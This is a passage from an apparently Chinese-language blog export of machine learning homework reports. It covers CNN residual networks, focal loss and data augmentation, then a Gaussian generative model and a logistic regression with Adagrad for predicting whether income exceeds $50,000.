nn.Linear(<span class="number">512</span>, <span class="number">11</span>),</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_residual</span>(<span class="params">self, block, ic, oc, num_layer, stride=<span class="number">1</span></span>):</span><br><span class="line">        layers = []</span><br><span class="line">        layers.append(block(ic, oc, stride))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num_layer):</span><br><span class="line">            layers.append(block(oc, oc))</span><br><span class="line">        <span class="keyword">return</span> nn.Sequential(*layers)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># [3, 128, 128]</span></span><br><span class="line">        out = self.preconv(x)  <span class="comment"># [32, 64, 64]</span></span><br><span class="line">        out = self.layer0(out) <span class="comment"># [64, 32, 32]</span></span><br><span class="line">        out = self.layer1(out) <span class="comment"># [128, 16, 16]</span></span><br><span class="line">        out = self.layer2(out) <span class="comment"># [256, 8, 8]</span></span><br><span class="line">        out = self.layer3(out) <span class="comment"># [512, 4, 4]</span></span><br><span class="line">        <span class="comment">#out = self.avgpool(out) # [512, 2, 2]</span></span><br><span class="line">        out = self.fc(out.view(out.size(<span class="number">0</span>), -<span class="number">1</span>)) </span><br><span class="line">        <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure>
<p>​    这种方法结合下面的平均交叉熵函数，应该能够在训练上达到很好的效果，经过更多轮次的训练应该可以更好的效果，但是训练时间应该会比较长，由于这个月kaggle GPU的时间已经超过了限制，训练的效果还需要进行进一步的测试。</p>
<h4 id="5-2-平衡交叉熵函数-Focal-loss"><a href="#5-2-平衡交叉熵函数-Focal-loss" class="headerlink" title="5.2 平衡交叉熵函数(Focal loss)"></a>5.2 平衡交叉熵函数(Focal loss)</h4><p>​        在资料查阅的过程中,又学习到一种应用于图像领域解决数据不平衡问题的方法。对于传统的分类问题交叉熵函数如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221206213439029.png" alt="image-20221206213439029"  /></p>
<p>​        我们考虑简单的二分类问题，损失函数可写成下面的形式，其中m为正样本数目，n为负样本数目，N为样本总数</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221206213528030.png" alt="image-20221206213528030"></p>
<p>​    当样本分布失衡时，就会造成损失函数L分布的倾斜，如m&lt;&lt;n时，就会使负样本在损失函数中占据主导地位，由于损失函数的倾斜，模型训练就会偏向，造成模型对少样本类别的性能比较差。那么为了解决这个问题，可以在损失函数中添加权重因子，如在上述的二分类问题中，我们就可以用下面方式添加权重参数：</p>
<script type="math/tex; mode=display">
\alpha \in[0,1]  和  1-\alpha \\

L=\frac{1}{N}\left(\sum_{y_{i}=1}^{m}-\alpha \log (\hat{p})+\sum_{y_{i}=0}^{n}-(1-\alpha) \log (1-\hat{p})\right)</script><p>​    其中$\frac{\alpha}{1-\alpha}=\frac{n}{m}$，也就是权重的大小根据正负样本的分布进行设置。</p>
<p>​    focal loss就是为了解决样本不均衡的问题，具体形式如下</p>
<script type="math/tex; mode=display">
L_{f l}=\left\{\begin{array}{ll}
-(1-\hat{p})^{\gamma} \log (\hat{p}) & \text { if } \mathrm{y}=1 \\
-\hat{p}^{\gamma} \log (1-\hat{p}) & \text { if } \mathrm{y}=0
\end{array}\right.</script><p>​     可将上式简化为下面的表达式，$L_{f l}=-\left(1-p_{t}\right)^{\gamma} \log \left(p_{t}\right)$反映了与ground truth即类别y的接近程度， pt 越大说明越接近类别y，即分类越准确。而$\gamma$为可调节因子，从上面式子可以看出，对于分类准确的样本，损失会变小，对于分类不准确的样本，损失基本没有改变，整体而言相当于增加了分类不准确样本的权重。</p>
<p>​     pt也反应了分类的难易程度， pt 越大，说明分类的置信度越高，代表样本越易分； pt 越小，分类的置信度越低，代表样本越难分。因此focal loss相当于增加了难分样本在损失函数的权重，使得损失函数倾向于难分的样本，有助于提高难分样本的准确度。</p>
<p>​    对于Focal loss，我们可以用下面的代码实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FocalLoss</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, class_num, alpha=<span class="literal">None</span>, gamma=<span class="number">2</span>, size_average=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="keyword">if</span> alpha <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.alpha = Variable(torch.ones(class_num, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(alpha, Variable):</span><br><span class="line">                self.alpha = alpha</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.alpha = Variable(alpha)</span><br><span class="line">        self.gamma = gamma</span><br><span class="line">        self.class_num = class_num</span><br><span class="line">        self.size_average = size_average</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, inputs, targets</span>):</span><br><span class="line">        N = inputs.size(<span class="number">0</span>)</span><br><span class="line">        C = inputs.size(<span class="number">1</span>)</span><br><span class="line">        P = F.softmax(inputs, dim=<span class="number">1</span>)</span><br><span class="line">        class_mask = inputs.data.new(N, C).fill_(<span class="number">0</span>)</span><br><span class="line">        class_mask = Variable(class_mask)</span><br><span class="line">        ids = targets.view(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        class_mask.scatter_(<span class="number">1</span>, ids.data, <span class="number">1.</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> inputs.is_cuda <span class="keyword">and</span> <span class="keyword">not</span> self.alpha.is_cuda:</span><br><span class="line">            self.alpha = self.alpha.cuda()</span><br><span class="line">        alpha = self.alpha[ids.data.view(-<span class="number">1</span>)]</span><br><span class="line">        probs = (P*class_mask).<span class="built_in">sum</span>(<span class="number">1</span>).view(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        log_p = probs.log()</span><br><span class="line">        </span><br><span class="line">        batch_loss = -alpha*(torch.<span class="built_in">pow</span>((<span class="number">1</span>-probs), self.gamma))*log_p</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.size_average:</span><br><span class="line">            loss = batch_loss.mean()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            loss = batch_loss.<span class="built_in">sum</span>()</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> loss</span><br></pre></td></tr></table></figure>
<h4 id="5-3-增加数据增强方法"><a href="#5-3-增加数据增强方法" class="headerlink" title="5.3 增加数据增强方法"></a>5.3 增加数据增强方法</h4><p>​    在找资料的过程中，许多博主采用了多种数据增强的方式，据说这样效果比较好，但是增加数据增强的方式会大大增加训练模型的时间。如果把下面的数据增强方法全部加入的话，训练的时间将大大增加。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># training 時做 data augmentation</span></span><br><span class="line">train_transform = transforms.Compose([</span><br><span class="line">    transforms.ToPILImage(),</span><br><span class="line">    <span class="comment">#将张量转为PIL图片，由小数转为0-255之间的像素值</span></span><br><span class="line">    transforms.RandomHorizontalFlip(),<span class="comment">#随机将图片进行水平翻转</span></span><br><span class="line">    transforms.RandomVerticalFlip(p=<span class="number">1</span>),     <span class="comment"># 随机上下翻转</span></span><br><span class="line">    transforms.RandomGrayscale(<span class="number">0.5</span>), <span class="comment"># 随机灰度化</span></span><br><span class="line">    transforms.RandomRotation(degrees=(<span class="number">0</span>, <span class="number">180</span>)), <span class="comment"># 图像随机旋转</span></span><br><span class="line">    transforms.RandomSolarize(threshold=<span class="number">192.0</span>),<span class="comment">#通过反转阈值以上的所有像素值，以给定的概率随机对图像进行日光化</span></span><br><span class="line">    transforms.ColorJitter(brightness=<span class="number">.5</span>,hue=<span class="number">0.5</span>), <span class="comment"># 改变图像的亮度和饱和度</span></span><br><span class="line">    transforms.ToTensor(), <span class="comment">#将图片转成Tensor，并把数值normalize到[0,1](data normalization)</span></span><br><span class="line">])</span><br></pre></td></tr></table></figure>
<h3 id="6-结论"><a href="#6-结论" class="headerlink" title="6.结论"></a>6.结论</h3><p>​    本次实验我们实现了CNN神经网络分类器，通过调整层数，使用不同的优化策略对模型进行训练，通过实作了解了pytorch实现CNN神经网络的方法。并能够计算参数量和传播维度，并比较了神经网络层数，data augmentation和normalization对训练结果的影响，并通过regularization和Dropout进一步对模型进行优化，更加深了对模型训练的理解。并且还进一步拓展图像处理网络，学习了残差神经网络和Focal loss等优化方法。</p>
]]></content>
      <categories>
        <category>Machine Learning</category>
      </categories>
      <tags>
        <tag>神经网络分类器 CNN</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习ML3</title>
    <url>/2022/12/08/ML%20Homework2/</url>
    <content><![CDATA[<hr>
<h1 id="ML-Homework2"><a href="#ML-Homework2" class="headerlink" title="ML Homework2"></a><centering>ML Homework2</centering></h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>​    用美国人口的一些信息预测收入是否大于$50,000,利用generative model、logistic regression两种方式对收入进行预测，并比较两种模型的准确率，采用一些方式来优化，并评估标准化和归一化对模型预测准确度的影响。</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>​    <strong>Host:</strong>win11;kaggle;python3.9</p>
<h2 id="实验方法和过程"><a href="#实验方法和过程" class="headerlink" title="实验方法和过程"></a>实验方法和过程</h2><h3 id="1-generative-module"><a href="#1-generative-module" class="headerlink" title="1.generative module"></a>1.generative module</h3><p>​    首先我们使用generative module来训练数据集，所谓generative moduel就是先根据已知经验对模型先做出假设分布，然后求联合分布概率的参数，找到一个最优化的联合分布的概率模型，然后用这个模型去做出预测。</p>
<h4 id="1-1-假设概率模型"><a href="#1-1-假设概率模型" class="headerlink" title="1.1 假设概率模型"></a>1.1 假设概率模型</h4><p>​    这里我们假设数据是按照高斯分布，高斯分布是自然界中一种常见的概率分布模型，具体计算公式如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221101210927276.png" alt="image-20221101210927276" style="zoom:67%;" /></p>
<h4 id="1-2-数据处理"><a href="#1-2-数据处理" class="headerlink" title="1.2 数据处理"></a>1.2 数据处理</h4><p>​    首先第一步是对训练数据集进行处理，这里X_train的数据经过了one-hot编码的形式，能够更好的被计算机进行处理，在数据处理的过程中这里还加入了标准差计算，按每一个feature计算均值和标准差(axis=0)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里X_train的数据经过了one-hot编码，也就是将数据转化为机器可以识别的编码内容。</span></span><br><span class="line"><span class="comment"># 简单来说，虽然每个数据样本的feature只有8个，但是feature中总共的情况共有106中，而且有些是无法进行识别的格式</span></span><br><span class="line"><span class="comment"># 这里我们将这106个parameter按照一维展开，作为数据样本的new feature，对于一些之前难以统计的feature，这里我们</span></span><br><span class="line"><span class="comment"># 只需要0和1对情况进行描述</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self,name,path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,newline = <span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">        <span class="comment">#将X_train对首行进行过滤，并将数据按float类型进行读出,把数据转化为二维数组</span></span><br><span class="line">        rows = np.array(<span class="built_in">list</span>(csv.reader(csvfile))[<span class="number">1</span>:] ,dtype = <span class="built_in">float</span>) </span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&#x27;X_train&#x27;</span>:</span><br><span class="line">            <span class="comment">#如果是X_train训练集，就将读取的数据进行标准化</span></span><br><span class="line">            <span class="comment">#按照列方向计算均值和标准差，计算后将数据转化为一行的shape//(32561, 106)</span></span><br><span class="line">            self.mean = np.mean(rows,axis = <span class="number">0</span>).reshape(<span class="number">1</span>,-<span class="number">1</span>)</span><br><span class="line">            self.std = np.std(rows,axis = <span class="number">0</span>).reshape(<span class="number">1</span>,-<span class="number">1</span>)</span><br><span class="line">            self.theta = np.ones((rows.shape[<span class="number">1</span>] + <span class="number">1</span>,<span class="number">1</span>),dtype = <span class="built_in">float</span>) </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows.shape[<span class="number">0</span>]):</span><br><span class="line">                rows[i,:] = (rows[i,:]-self.mean)/self.std</span><br><span class="line">            <span class="comment">#上面就是对rows进行标准化</span></span><br><span class="line">        <span class="keyword">elif</span> name == <span class="string">&#x27;X_test&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows.shape[<span class="number">0</span>]):</span><br><span class="line">                rows[i,:] = (rows[i,:]-self.mean)/self.std</span><br><span class="line">        <span class="comment">#这里需要用train的标准化规则来标准化测试集，因为在预测时我们需要按照train集的标准来看待训练集中的数据</span></span><br><span class="line">        <span class="comment">#例如训练集最大值为100，标准化之后为1，而测试集最大值为200，按训练集的标准化规则为1.5，而如果用测试集的标准化规则就会为1。但此时的模型会将1看做100，而不是200，会造成误差，并且有实时数据来应用模型，采用训练集的标准化规则，更适合于模型。</span></span><br><span class="line">        self.data[name] = rows  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="1-3-计算模型参数"><a href="#1-3-计算模型参数" class="headerlink" title="1.3 计算模型参数"></a>1.3 计算模型参数</h4><p>​    这里需要计算高斯分布中的$\mu$和$\sum$,这里连个参数需要满足在每个分类的高斯模型下，能够让每一个sample出现概率的乘积最大。可以通过下图给出的公式进行计算，也可以对$L(\mu,\sum)$求它$\mu$和$\sum$各自的偏微分，然后找出偏微分为0的点。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221101211901234.png" alt="image-20221101211901234" style="zoom: 80%;" /></p>
<p>​    首先应该将数据进行分类，因为不同的模型这里要看成不同的高斯分布加以区分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面的循环是将类1和类2的向量索引加入</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.data[<span class="string">&#x27;Y_train&#x27;</span>].shape[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">if</span> self.data[<span class="string">&#x27;Y_train&#x27;</span>][i][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        class_0_id.append(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        class_1_id.append(i)</span><br><span class="line"><span class="comment">#分别取出类1和类2的parameters</span></span><br><span class="line">class_0 = self.data[<span class="string">&#x27;X_train&#x27;</span>][class_0_id]</span><br><span class="line">class_1 = self.data[<span class="string">&#x27;X_train&#x27;</span>][class_1_id] </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    计算参数时，我们应用上面的公式，这里由于向量维度较高，因此这里计算的是协方差矩阵</p>
<p>1.求每一列的$\mu$</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221101214747004.png" alt="image-20221101214747004"></p>
<p>2.计算协方差矩阵</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221101214840618.png" alt="image-20221101214840618"></p>
<p>举一个例子</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221101214848642.png" alt="image-20221101214848642" style="zoom:80%;" /></p>
<p>​    这里我们计算协方差矩阵时，可以整体计算，也可以按每一行迭代进行计算(106,1)<em>(1,106)，这里两个类别分别使用各自的 <strong><img src="https://private.codecogs.com/gif.latex?%5Cmu" alt="\mu">，<img src="https://private.codecogs.com/gif.latex?%5CSigma" alt="\Sigma"></strong>，这样不好。因为<strong><img src="https://private.codecogs.com/gif.latex?%5CSigma" alt="\Sigma"></strong>和input的大小平方成正比（比如有2个参数，<strong><img src="https://private.codecogs.com/gif.latex?%5CSigma" alt="\Sigma"></strong>就有4个参数），所以当 input 变大的话，会造成参数变多，造成variance（方差）太大，就会overfitting。所以，为了避免这个问题，就让两个class的分布共用一个 <strong><img src="https://private.codecogs.com/gif.latex?%5CSigma" alt="\Sigma"></strong> 的参数（对比原来的话就少了一个<em>*<img src="https://private.codecogs.com/gif.latex?%5CSigma" alt="\Sigma"></em></em>的参数），新的$\sum$是原来两个$\sum$的均方根。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#按列方向求均值</span></span><br><span class="line">mean_0 = np.mean(class_0,axis = <span class="number">0</span>)</span><br><span class="line"><span class="comment">#print(mean_0.shape) (106,)</span></span><br><span class="line">mean_1 = np.mean(class_1,axis = <span class="number">0</span>)  </span><br><span class="line"><span class="comment">#初始化协方差矩阵</span></span><br><span class="line">n = class_0.shape[<span class="number">1</span>]</span><br><span class="line">cov_0 = np.zeros((n,n))</span><br><span class="line">cov_1 = np.zeros((n,n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(class_0.shape) (24720, 106)</span></span><br><span class="line"><span class="comment">#遍历所有分类是0的训练数据</span></span><br><span class="line"><span class="comment">#print(np.transpose([class_0[0]-mean_0]).shape) (106,1)</span></span><br><span class="line"><span class="comment">#下面是协方差矩阵的计算，等于每一行转置乘扩展到整个矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(class_0.shape[<span class="number">0</span>]):</span><br><span class="line">    cov_0 += np.dot(np.transpose([class_0[i]-mean_0]),[class_0[i]-mean_0])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(class_1.shape[<span class="number">0</span>]):</span><br><span class="line">    cov_1 += np.dot(np.transpose([class_1[i]-mean_1]),[class_1[i]-mean_1])</span><br><span class="line"></span><br><span class="line">cov_0 /= class_0.shape[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#除数据的个数</span></span><br><span class="line">cov_1 /= class_1.shape[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#优化的方式是两个模型用一个协方差矩阵</span></span><br><span class="line">cov = ((cov_0*class_0.shape[<span class="number">0</span>])+(cov_1*class_1.shape[<span class="number">0</span>]))/(class_0.shape[<span class="number">0</span>]+class_1.shape[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#这里feature之间有关联所以是后验概率</span></span><br><span class="line">cov_inv = inv(cov)</span><br><span class="line"><span class="comment">#对协方差矩阵求逆</span></span><br></pre></td></tr></table></figure>
<h4 id="1-4-后验概率"><a href="#1-4-后验概率" class="headerlink" title="1.4 后验概率"></a>1.4 后验概率</h4><p>​    按照后验概率，我们对模型进行化简，得到一个Sigmoid function。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221101215505203.png" alt="image-20221101215505203" style="zoom: 67%;" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面的f函数是一个sigmid function，将求得的y值在0-1之间</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">self,x</span>):</span><br><span class="line">    arr = np.empty([x.shape[<span class="number">0</span>],<span class="number">1</span>],dtype=<span class="built_in">float</span>)</span><br><span class="line">    <span class="comment">#print(arr)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x.shape[<span class="number">0</span>]):</span><br><span class="line">        z = x[i].dot(self.w) + self.b</span><br><span class="line">        <span class="comment">#print(z)</span></span><br><span class="line">        z *= (-<span class="number">1</span>)</span><br><span class="line">        arr[i][<span class="number">0</span>] = <span class="number">1</span> / (<span class="number">1</span> + np.exp(z))</span><br><span class="line">    <span class="keyword">return</span> np.clip(arr, <span class="number">1e-8</span>, <span class="number">1</span>-(<span class="number">1e-8</span>))</span><br></pre></td></tr></table></figure>
<p>​    对上面的sigmoid function进行化简，我们会得到对z的线性函数，当我们得到了$\mu$和$\sum$两个参数，就可以直接计算出z，从而得到高斯分布上的概率。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221101215602089.png" alt="image-20221101215602089" style="zoom:67%;" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.w = np.dot(cov_inv,(mean_0-mean_1).T)</span><br><span class="line">  self.b = (-<span class="number">0.5</span>)*np.dot(np.dot(mean_0.T,cov_inv),mean_0) +(<span class="number">0.5</span>)*np.dot(np.dot(mean_1.T,cov_inv),mean_1)+np.log(<span class="built_in">float</span>(class_0.shape[<span class="number">0</span>])/class_1.shape[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<h3 id="2-generative-module实验结果分析与评估"><a href="#2-generative-module实验结果分析与评估" class="headerlink" title="2.generative module实验结果分析与评估"></a>2.generative module实验结果分析与评估</h3><h4 id="2-1-准确度判断及结果预测"><a href="#2-1-准确度判断及结果预测" class="headerlink" title="2.1 准确度判断及结果预测"></a>2.1 准确度判断及结果预测</h4><p>​    首先我们对训练完成模型的预测准确度进行评估，这里准确度的计算方法是，统计预测值和真实值之间的平方和，得到概率偏差，然后用1减去概率偏差得到准确度。计算得到训练集上的准确度是0.8425724025674888。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">accurancy</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment">#准确率统计函数，统计预测值和真实值之间差的平方，可以得到准确率</span></span><br><span class="line">    acc = <span class="number">1</span>-np.mean(np.<span class="built_in">abs</span>(self.data[<span class="string">&#x27;Y_train&#x27;</span>]-self.answer))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;在训练集上的准确率为&quot;</span>,acc)</span><br></pre></td></tr></table></figure>
<p>​    然后我们用训练好的parameter来对text集的预测值进行预测，预测部分结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221105212315372.png" alt="image-20221105212315372"></p>
<h4 id="2-2-数据归一化对准确度的影响"><a href="#2-2-数据归一化对准确度的影响" class="headerlink" title="2.2 数据归一化对准确度的影响"></a>2.2 数据归一化对准确度的影响</h4><p>​    我们分别计算了带有归一化过程和无归一化过程训练模型预测的准确度，对比如下</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">归一化</th>
<th style="text-align:center">无归一化</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">准确度</td>
<td style="text-align:center">0.8420810171677774</td>
<td style="text-align:center">0.8425724025674888</td>
</tr>
</tbody>
</table>
</div>
<p>​    可以看到无归一化过程的训练模型预测的准确度反而较高，但是总体来说二者准确度相差并不大，这是由于归一化减小了方差很大的数据的影响，但是在总体上没有改变数据样本的分布情况，因此对于generative module有无归一化过程影响并不大。</p>
<h3 id="3-Discriminative-module"><a href="#3-Discriminative-module" class="headerlink" title="3.Discriminative module"></a>3.Discriminative module</h3><p>​    下面我们将用逻辑回归的方式对模型进行训练，逻辑回归的方式是一种Discriminative module，Discriminative module是直接对数据进行训练，找不同分类之间的分界线。</p>
<h4 id="3-1-数据读取和预处理"><a href="#3-1-数据读取和预处理" class="headerlink" title="3.1 数据读取和预处理"></a>3.1 数据读取和预处理</h4><p>​    这里数据读取和generative module基本一致，都是从文件中读取数据，然后进行标准化处理，将每一个变量按列的方向进行求均值和计算方差的运算。</p>
<p>​    在logistic regression中，我们需要进行验证集和训练集的分割，如果用整个样本来训练模型，模型已经拟合了几乎所有样本的特征，此时再将样本集划分训练集和测试集，就已经让测试集的所有信息被模型给学习到了，模型在已经学习过的样本集上当然效果会显著，所以要先划分训练集和测试集进行处理。</p>
<p>​    为了使验证集和数据集的选择更加随机，这里采用了np中的shuffle函数来随机的打乱数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">randomize_set</span>(<span class="params">x,y</span>):</span><br><span class="line">    arange_list = np.arange(x.shape[<span class="number">0</span>])</span><br><span class="line">    np.random.shuffle(arange_list) <span class="comment">#shuffle方法将所有的元素进行随机排列</span></span><br><span class="line">    <span class="keyword">return</span> (x[arange_list],y[arange_list])</span><br></pre></td></tr></table></figure>
<p>​    下面是按照一定的比例来划分集合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">train_split</span>(<span class="params">X,Y,dev_ratio</span>):</span><br><span class="line">    train_number = <span class="built_in">int</span>(X.shape[<span class="number">0</span>]*(<span class="number">1</span>-dev_ratio))</span><br><span class="line">    <span class="keyword">return</span> X[:train_number],Y[:train_number],X[train_number:],Y[train_number:]</span><br></pre></td></tr></table></figure>
<h4 id="3-2-梯度下降"><a href="#3-2-梯度下降" class="headerlink" title="3.2 梯度下降"></a>3.2 梯度下降</h4><h5 id="3-2-1-Adagradient"><a href="#3-2-1-Adagradient" class="headerlink" title="3.2.1 Adagradient"></a>3.2.1 Adagradient</h5><p>​    首先我们使用在linear regression中效果比较好的Adagrad进行梯度下降，首先是梯度下降函数，梯度下降函数就是对Loss function的导数，在Logistic regression中我们选用交叉熵来作为损失函数，因为如果还是选择平方和误差函数作为梯度下降的函数，梯度下降函数比较难以收敛，而交叉熵可以正确的反应梯度下降的方向和趋势。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/20200214001205760.png" alt="img" style="zoom:67%;" /></p>
<p>​    黑色的是Cross Entropy，红色的是Square Error。可以看出用 Square Error 无论在哪个点，它算出来的gradient都很小，所以参数更新速度慢。</p>
<p>​    梯度下降函数是每次对loss求导后更新，下面是对Loss function求导的过程，可以看到最后就是y的真实值减去predict函数的预测值然后乘以对应$w_{j}$的系数$x_{j}$</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221105215055837.png" alt="image-20221105215055837" style="zoom:80%;" /></p>
<p>​    其中</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221105215122853.png" alt="image-20221105215122853" style="zoom:80%;" /></p>
<p>化简得</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221105215132594.png" alt="image-20221105215132594" style="zoom:80%;" /></p>
<p>具体代码实现如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面定义sigmoid函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sigmoid</span>(<span class="params">z</span>):</span><br><span class="line">    <span class="comment">#这里为了避免溢出，限定最大值和最小值</span></span><br><span class="line">    <span class="keyword">return</span> np.clip(<span class="number">1</span>/(<span class="number">1.0</span>+np.exp(-z)),<span class="number">1e-8</span>,<span class="number">1</span>-(<span class="number">1e-8</span>))<span class="comment">#clip函数将数的范围限制，避免训练后溢出</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">X,w,b</span>):</span><br><span class="line">    <span class="comment">#对于训练完成后的参数w和b，我们使用这两个参数进行结果预测</span></span><br><span class="line">    <span class="keyword">return</span> sigmoid(np.dot(X,w)+b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#下面是梯度下降函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradient</span>(<span class="params">X,y_r,w,b</span>):</span><br><span class="line">    y_predict = func(X,w,b)<span class="comment">#做出预测</span></span><br><span class="line">    error = y_r - y_predict <span class="comment">#偏差</span></span><br><span class="line">    w_grad = -np.dot(X.T,error)</span><br><span class="line">    b_grad = -np.<span class="built_in">sum</span>(error)</span><br><span class="line">    <span class="comment">#w_grad /= X.shape[0]</span></span><br><span class="line">    <span class="comment">#b_grad /= X.shape[0]</span></span><br><span class="line">    <span class="keyword">return</span> w_grad,<span class="built_in">float</span>(b_grad)</span><br><span class="line">    <span class="comment">#sum函数参数axis=1是压缩列，也就是按照每一行对元素进行相加，将矩阵压缩为一列</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>​    Adagradient根据每次步数的叠加对损失率实时更新，并且为了更好的找到下降的步数，求取了以往梯度的平方和，下面是Adagrad的具体代码，具体的原理我们在linear regression中介绍过，这里不再赘述。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面我们用Adagrad进行梯度下降</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Adagrad</span>(<span class="params">X_train,Y_train</span>):</span><br><span class="line">    w = np.full((<span class="number">106</span>,<span class="number">1</span>),<span class="number">0</span>) <span class="comment">#这样是看成一个二维的列向量进行填充</span></span><br><span class="line">    <span class="comment">#我们这里一共有106个feature</span></span><br><span class="line">    b = np.zeros(<span class="number">1</span>)</span><br><span class="line">    w_grad_sum = np.ones((<span class="number">106</span>,<span class="number">1</span>))</span><br><span class="line">    b_grad_sum = np.zeros(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        w_grad,b_grad = gradient(X_train,Y_train,w,b)</span><br><span class="line">        w_grad_sum += w_grad**<span class="number">2</span></span><br><span class="line">        b_grad_sum += b_grad**<span class="number">2</span></span><br><span class="line">        w = w -lr*w_grad/np.sqrt(w_grad_sum)</span><br><span class="line">        b = b - lr*b_grad/np.sqrt(b_grad_sum)</span><br><span class="line">    <span class="keyword">return</span> w,b</span><br></pre></td></tr></table></figure>
